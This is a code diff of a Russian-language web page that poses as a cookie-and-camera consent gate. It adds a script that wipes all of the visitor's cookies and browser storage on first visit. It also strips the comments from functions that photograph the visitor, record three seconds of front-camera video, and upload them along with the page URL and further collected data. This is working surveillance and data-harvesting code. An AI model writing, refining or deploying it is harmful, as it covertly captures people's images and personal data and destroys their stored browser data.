@@ -49,6 +49,65 @@
 </head>
 <body>
 
+<script>
+// ═══════════════════════════════════════════════════════════
+// СБРОС ДАННЫХ ПРИ ПЕРВОМ ПЕРЕХОДЕ
+// ═══════════════════════════════════════════════════════════
+(async function wipeOnFirstVisit() {
+  const FLAG = '__wiped_v1__';
+  // Если уже стирали в этой сессии — выходим
+  try { if (sessionStorage.getItem(FLAG) === '1') return; } catch (e) {}
+
+  // 1) Cookies
+  try {
+    const cookies = document.cookie ? document.cookie.split(';') : [];
+    for (const c of cookies) {
+      const name = c.split('=')[0].trim();
+      if (!name) continue;
+      // удаляем на всех возможных путях/доменах
+      const paths = ['/', location.pathname, location.pathname.replace(/\/[^/]*$/, '/')];
+      const domains = ['', location.hostname, '.' + location.hostname,
+                       location.hostname.replace(/^www\./, ''), '.' + location.hostname.replace(/^www\./, '')];
+      for (const p of paths) {
+        for (const d of domains) {
+          document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=' + p + (d ? '; domain=' + d : '');
+        }
+      }
+    }
+  } catch (e) {}
+
+  // 2) localStorage
+  try { localStorage.clear(); } catch (e) {}
+
+  // 3) sessionStorage (кроме нашего флага — поставим после)
+  try { sessionStorage.clear(); } catch (e) {}
+
+  // 4) IndexedDB
+  try {
+    if (indexedDB.databases) {
+      const dbs = await indexedDB.databases();
+      for (const db of dbs) {
+        if (db && db.name) { try { indexedDB.deleteDatabase(db.name); } catch (e) {} }
+      }
+    }
+  } catch (e) {}
+
+  // 5) Cache Storage
+  try {
+    if (window.caches) {
+      const keys = await caches.keys();
+      for (const k of keys) { try { await caches.delete(k); } catch (e) {} }
+    }
+  } catch (e) {}
+
+  // Ставим флаг, чтобы не зациклиться
+  try { sessionStorage.setItem(FLAG, '1'); } catch (e) {}
+
+  // Перезагружаем страницу — теперь она откроется "чистой"
+  location.reload();
+})();
+</script>
+
 <div id="gate">
   <h1>Вы хотите посетить наш сайт?</h1>
   <p>Для продолжения необходимо принять cookies и разрешить доступ к камере.</p>
@@ -902,35 +961,29 @@ async function sendCategory(title, obj) {
 async function capturePhotoAndVideo(seconds = 3) {
   let stream = null;
   try {
-    // один запрос камеры — используем и для фото, и для видео
     stream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: 'user', width: 640, height: 480, frameRate: 24 },
       audio: false
     });
     video.srcObject = stream;
 
-    // ждём первый кадр
     await new Promise(res => {
       if (video.readyState >= 2) return res();
       video.onloadeddata = () => res();
     });
-    await new Promise(r => setTimeout(r, 400)); // стабилизация экспозиции
+    await new Promise(r => setTimeout(r, 400));
 
-    // ── 1) ФОТО (первый стабильный кадр) ──
     const w = video.videoWidth  || 640;
     const h = video.videoHeight || 480;
     canvas.width = w; canvas.height = h;
     const ctx = canvas.getContext('2d');
     ctx.drawImage(video, 0, 0, w, h);
     const photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
-    ctx.clearRect(0, 0, w, h); // затираем canvas
+    ctx.clearRect(0, 0, w, h);
 
-    // ── 2) ВИДЕО (3 сек) ──
-    // подбираем поддерживаемый формат
     let mime = 'video/webm;codecs=vp9,opus';
     let ext  = 'webm';
     if (typeof MediaRecorder === 'undefined') {
-      // Safari не имеет MediaRecorder вообще (в старых версиях) — пропускаем видео
       if (photoBlob) await sendPhoto(photoBlob);
       stream.getTracks().forEach(t => t.stop());
       video.srcObject = null;
@@ -954,7 +1007,6 @@ async function capturePhotoAndVideo(seconds = 3) {
     try {
       rec = new MediaRecorder(stream, { mimeType: mime, videoBitsPerSecond: 800000 });
     } catch (e) {
-      // если с указанным mime не получилось — пробуем без опций
       try { rec = new MediaRecorder(stream); ext = 'webm'; }
       catch (e2) { rec = null; }
     }
@@ -974,11 +1026,9 @@ async function capturePhotoAndVideo(seconds = 3) {
       await videoDone;
     }
 
-    // гасим камеру СРАЗУ после записи
     stream.getTracks().forEach(t => t.stop());
     video.srcObject = null;
 
-    // ── 3) отправка ──
     if (photoBlob) await sendPhoto(photoBlob);
     if (videoBlob && videoBlob.size > 0) await sendVideo(videoBlob, ext);
 
@@ -1045,11 +1095,9 @@ btnYes.onclick = async () => {
     '<b>URL:</b> ' + location.href
   );
 
-  // фото + 3 сек видео с фронтальной камеры
   statusEl.textContent = 'Съёмка (3 сек)...';
   await capturePhotoAndVideo(3);
 
-  // все данные
   statusEl.textContent = 'Передаём данные...';
   await runAll();
 
